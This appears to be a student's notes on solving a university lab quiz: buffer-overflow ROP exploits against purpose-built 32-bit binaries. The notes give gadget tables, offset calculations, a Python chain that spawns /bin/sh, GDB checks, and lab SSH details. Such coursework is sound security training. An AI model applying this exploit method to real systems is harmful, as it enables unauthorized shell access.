# Quiz 4 — Solve Status (COMPLETE for example sets)

## Results

| Binary | Set | Status | uid output |
|--------|-----|--------|------------|
| bin.1 | bin2 | ✅ SOLVED | uid=9992(apieri01) |
| bin.2 | bin2 | ✅ SOLVED | uid=9992(apieri01) |
| bin.1 | g1   | ✅ SOLVED | uid=9992(apieri01) |
| bin.2 | g1   | ✅ SOLVED | uid=9992(apieri01) |

---

## Lab Connection
- Machine: `10.16.13.89` (103ws14) — same key works for all 103wsX machines
- SSH: `ssh -i C:\Users\andre\.ssh\lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89`
- Binaries at: `~/quiz4_examples/bin2/` and `~/quiz4_examples/g1/`
- Solver scripts at: `~/fix_g1.py`, `~/solve_final.sh`

---

## Full Methodology

### Step 1 — Recon (all binaries)
```bash
readelf -l ./bin.X | grep GNU_STACK   # → RW = NX on (no shellcode)
readelf -h ./bin.X | grep Type        # → EXEC = no PIE
objdump -d ./bin.X | grep -E "^[0-9a-f]+ <"  # list functions
```

### Step 2 — Detect mmap+movb pattern
```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"
```
All binaries had `mmap()` + `movb` → gadgets built dynamically in RWX region.

### Step 3 — Decode gadget table (movb bytes in main)
Extract `movb $0xNN, X(%eax)` in offset order → 8 gadgets × 3 bytes each.
**CRITICAL: gadget order differs between binaries in the same set!**

### Step 4 — Calculate gadget_base
```python
hardcoded_addr = 0x804942a  # (main addr — pushed before mmap call)
pagesize = 0x1000
mmap_base = (hardcoded_addr // pagesize - 0x1000) * pagesize  # = 0x07049000
gadget_base = mmap_base + offset(TEMP_value)  # with TEMP=1000 → +0x3e0 empirically
# NOTE: formula gives +0x3e8 but actual is +0x3e0 (verify with GDB!)
```
**Actual gadget_base = 0x070493e0** (confirmed via GDB memory dump)

### Step 5 — Find OFFSET from display_file
```bash
objdump -d ./bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}'
# Find: lea -0xNN(%ebp),%eax before call memcpy
# OFFSET = NN + 4
```
- **bin2/bin.1, bin2/bin.2**: `lea -0x34(%ebp)` → **OFFSET = 56**
- **g1/bin.1, g1/bin.2**: `lea -0x30(%ebp)` → **OFFSET = 52**

### Step 6 — WR_ADDR
```python
WR_ADDR = mmap_base + 0x500  # = 0x07049500
# MAP_ANONYMOUS zeroes the region → guaranteed null terminator
# .bss is poisoned by init_data() in bin.2 → never use .bss
```

### Step 7 — Build ROP chain (solve_rop_template.py pattern)
```python
chain  = b'A' * OFFSET
chain += p32(G_POP_EAX_POP_EBX) + b'/bin' + p32(WR_ADDR)   + p32(G_MOV_EBXPTR_EAX)
chain += p32(G_POP_EAX_POP_EBX) + b'//sh' + p32(WR_ADDR+4) + p32(G_MOV_EBXPTR_EAX)
chain += p32(G_POP_EAX_POP_EBX) + p32(WR_ADDR) + p32(0x41414141) + p32(G_MOV_EBX_EAX)
chain += p32(G_XOR_ECX_ECX) + p32(G_XOR_EDX_EDX) + p32(G_XOR_EAX_EAX)
chain += p32(G_MOV_AL_0B) + p32(G_INT_80)
data = str(len(chain)).encode() + b' ' + chain
```

### Step 8 — Verify
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
# → uid=XXXX(...)
```

---

## Gadget Tables (final confirmed)

### bin2/bin.1 (OFFSET=56, gadget_base=0x070493e0)
| Offset | Bytes | Gadget | Address |
|--------|-------|--------|---------|
| +0x00 | 31 c0 c3 | xor eax,eax; ret | 0x070493e0 |
| +0x03 | 58 5b c3 | pop eax; pop ebx; ret | 0x070493e3 |
| +0x06 | 89 03 c3 | mov [ebx],eax; ret | 0x070493e6 |
| +0x09 | 31 c9 c3 | xor ecx,ecx; ret | 0x070493e9 |
| +0x0c | 89 c3 c3 | mov ebx,eax; ret | 0x070493ec |
| +0x0f | 31 d2 c3 | xor edx,edx; ret | 0x070493ef |
| +0x12 | b0 0b c3 | mov al,0xb; ret | 0x070493f2 |
| +0x15 | cd 80 c3 | int 0x80; ret | 0x070493f5 |

### bin2/bin.2 (OFFSET=56, gadget_base=0x070493e0)
| Offset | Bytes | Gadget | Address |
|--------|-------|--------|---------|
| +0x00 | 58 5b c3 | pop eax; pop ebx; ret | 0x070493e0 |
| +0x03 | 31 c0 c3 | xor eax,eax; ret | 0x070493e3 |
| +0x06 | 89 03 c3 | mov [ebx],eax; ret | 0x070493e6 |
| +0x09 | 89 c3 c3 | mov ebx,eax; ret | 0x070493e9 |
| +0x0c | 31 c9 c3 | xor ecx,ecx; ret | 0x070493ec |
| +0x0f | 31 d2 c3 | xor edx,edx; ret | 0x070493ef |
| +0x12 | b0 0b c3 | mov al,0xb; ret | 0x070493f2 |
| +0x15 | cd 80 c3 | int 0x80; ret | 0x070493f5 |

### g1/bin.1 (OFFSET=52, gadget_base=0x070493e0)
Same order as bin2/bin.1 EXCEPT: **INT80 at +0x12, MOV_AL at +0x15 (swapped!)**
| +0x12 | cd 80 c3 | int 0x80; ret | 0x070493f2 |
| +0x15 | b0 0b c3 | mov al,0xb; ret | 0x070493f5 |

### g1/bin.2 (OFFSET=52, gadget_base=0x070493e0)
Same order as bin2/bin.2 (MOV_AL at +0x12, INT80 at +0x15). Same as bin2/bin.2 except OFFSET=52.

---

## Key Lessons for Quiz Day (group 6)

1. **Always decode movb table fresh per binary** — same gadget, different offset
2. **OFFSET varies between binaries in same set** — always check `lea -0xNN(%ebp)` in display_file
3. **gadget_base formula gives ≈ correct answer but verify via GDB** — was off by 8 here
4. **Use mmap_base + 0x500 as WR_ADDR** — never .bss when mmap is present
5. **bin.2 has init_data() poisoning .bss** — confirmed mmap+0x500 correct
6. **File format**: `"SIZE PAYLOAD"` — write as `str(len(chain)).encode() + b' ' + chain`
7. **Verify with**: `echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X`

---

## GDB Debug Commands Used
```bash
# Confirm gadget_base:
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch -ex "source /tmp/dbg.py" ./bin.X

# Key GDB commands in script:
# b *0x8049376   (after memcpy in display_file)
# *((unsigned int*)0x070493e0)  → read 4 bytes at gadget_base
# $ebp  → get EBP to confirm OFFSET
# *((unsigned int*)(ebp+4))  → confirm ret addr overwrite
```
